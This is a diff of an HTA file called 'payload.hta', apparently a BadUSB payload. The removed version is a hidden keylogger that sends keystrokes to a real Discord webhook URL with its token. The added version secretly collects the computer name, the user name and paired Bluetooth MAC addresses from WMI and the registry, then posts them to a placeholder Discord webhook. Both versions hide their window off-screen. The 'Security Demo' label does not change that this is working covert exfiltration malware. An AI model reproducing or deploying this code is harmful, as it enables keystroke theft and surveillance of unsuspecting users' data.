@@ -1,44 +1,143 @@
-<!-- payload.hta -->
 <html>
 <head>
-  <hta:application id="oHTA" applicationname="System Check" border="none" caption="no" showintaskbar="no" singleinstance="yes" sysmenu="no" windowstate="minimize"/>
-</head>
-<body style="margin:0; overflow:hidden; background:#000;">
-
+<HTA:APPLICATION
+  WINDOWSTATE="minimize"
+  SHOWINTASKBAR="no"
+  SYSMENU="no"
+  CAPTION="no"
+  BORDER="none"
+  SCROLL="no"
+  SINGLEINSTANCE="yes"
+/>
 <script language="JScript">
-  var log = "";
-  var webhook = "https://discord.com/api/webhooks/1472244980662927381/FycSobkkKh_MzI-EcY_cZYC7OGdo9U8yTKBReRTzkfeagFVW6hit4W7ODQ8MqwCL9iiv";
+// 창을 화면 밖으로 숨기기
+window.resizeTo(0, 0);
+window.moveTo(-9999, -9999);
 
-  document.addEventListener("keydown", function(e) {
-    var key = e.key;
-    if (key === "Enter") key = "[ENTER]";
-    if (key === "Backspace") key = "[BACKSPACE]";
-    if (key === "Tab") key = "[TAB]";
-    if (key === " ") key = "[SPACE]";
-    if (key.length > 1) key = "[" + key + "]";
-    log += key;
+var WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
 
-    if (log.length > 30) {
-      new Image().src = webhook + "?log=" + encodeURIComponent(log + " | UA: " + navigator.userAgent + " | Time: " + new Date().toLocaleString());
-      log = "";
+function getEnvVar(name) {
+  try {
+    var sh = new ActiveXObject("WScript.Shell");
+    return sh.ExpandEnvironmentStrings("%" + name + "%");
+  } catch(e) { return "unknown"; }
+}
+
+// WMI로 블루투스 페어링된 기기 목록 수집
+function getBluetoothDevices() {
+  var devices = [];
+  try {
+    var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+    // Bluetooth 클래스 GUID
+    var query = "SELECT * FROM Win32_PnPEntity WHERE ClassGuid='{e0cbf06c-cd8b-4647-bb8a-263b43f0f974}'";
+    var items = wmi.ExecQuery(query);
+    var e = new Enumerator(items);
+    for (; !e.atEnd(); e.moveNext()) {
+      var d = e.item();
+      if (d.Name && d.Name.indexOf("Bluetooth") === -1) {
+        devices.push(d.Name);
+      }
     }
+  } catch(e) {}
+  return devices;
+}
+
+// 레지스트리에서 MAC 주소 + 마지막 연결 시간 수집
+function getBluetoothMACs() {
+  var result = [];
+  try {
+    var reg = GetObject("winmgmts:{impersonationLevel=impersonate}!root/default:StdRegProv");
+    var HKLM = 0x80000002;
+    var basePath = "SYSTEM\\CurrentControlSet\\Services\\BTHPORT\\Parameters\\Devices";
+
+    var inP = reg.Methods_("EnumKey").InParameters.SpawnInstance_();
+    inP.hDefKey = HKLM;
+    inP.sSubKeyName = basePath;
+    var outP = reg.ExecMethod_("EnumKey", inP);
+
+    if (outP.sNames) {
+      var keys = outP.sNames.toArray();
+      for (var i = 0; i < keys.length; i++) {
+        var mac = keys[i];
+        // MAC 주소 포맷: aabbccddeeff → aa:bb:cc:dd:ee:ff
+        var macFormatted = mac.replace(/(.{2})(?=.)/g, "$1:");
+
+        // 기기 이름 읽기 (REG_BINARY → 문자열 변환)
+        var devName = "";
+        try {
+          var nameIn = reg.Methods_("GetBinaryValue").InParameters.SpawnInstance_();
+          nameIn.hDefKey = HKLM;
+          nameIn.sSubKeyName = basePath + "\\" + mac;
+          nameIn.sValueName = "Name";
+          var nameOut = reg.ExecMethod_("GetBinaryValue", nameIn);
+          if (nameOut.uValue) {
+            var bytes = nameOut.uValue.toArray();
+            for (var j = 0; j < bytes.length; j += 2) {
+              if (bytes[j] === 0) break;
+              devName += String.fromCharCode(bytes[j]);
+            }
+          }
+        } catch(e) {}
+
+        result.push({
+          mac: macFormatted.toUpperCase(),
+          name: devName || "(이름 없음)"
+        });
+      }
+    }
+  } catch(e) {}
+  return result;
+}
+
+function run() {
+  var computer = getEnvVar("COMPUTERNAME");
+  var user     = getEnvVar("USERNAME");
+  var os       = getEnvVar("OS");
+  var now      = new Date().toLocaleString("ko-KR");
+
+  var wmiDevices = getBluetoothDevices();
+  var macDevices = getBluetoothMACs();
+
+  // 기기 목록 합치기 (MAC 정보 우선)
+  var deviceLines = "";
+  if (macDevices.length > 0) {
+    for (var i = 0; i < macDevices.length; i++) {
+      deviceLines += macDevices[i].name + "\\n`MAC: " + macDevices[i].mac + "`\\n";
+    }
+  } else if (wmiDevices.length > 0) {
+    deviceLines = wmiDevices.join("\\n");
+  } else {
+    deviceLines = "페어링된 기기 없음 (또는 블루투스 꺼짐)";
+  }
+
+  // 디스코드 웹훅 Embed 포맷
+  var payload = JSON.stringify({
+    username: "BadUSB Demo",
+    embeds: [{
+      title: "\uD83D\uDD35 Bluetooth Devices Captured",
+      color: 3447003,
+      fields: [
+        { name: "\uD83D\uDCBB Computer", value: computer, inline: true },
+        { name: "\uD83D\uDC64 User",     value: user,     inline: true },
+        { name: "\uD83D\uDD52 Time",     value: now,      inline: false },
+        { name: "\uD83D\uDCF1 Paired Bluetooth Devices", value: deviceLines || "없음" }
+      ],
+      footer: { text: "BadUSB Security Demo" }
+    }]
   });
 
-  window.addEventListener("blur", function() {
-    if (log.length > 0) {
-      new Image().src = webhook + "?log=" + encodeURIComponent("Session Log: " + log);
-      log = "";
-    }
-  });
+  try {
+    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+    xhr.open("POST", WEBHOOK_URL, false);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(payload);
+  } catch(e) {}
 
-  window.addEventListener("beforeunload", function() {
-    if (log.length > 0) {
-      new Image().src = webhook + "?log=" + encodeURIComponent("Browser Log: " + log);
-    }
-  });
+  window.close();
+}
 
-  window.moveTo(-10000, -10000);
-  window.resizeTo(1, 1);
+run();
 </script>
-</body>
+</head>
+<body></body>
 </html>
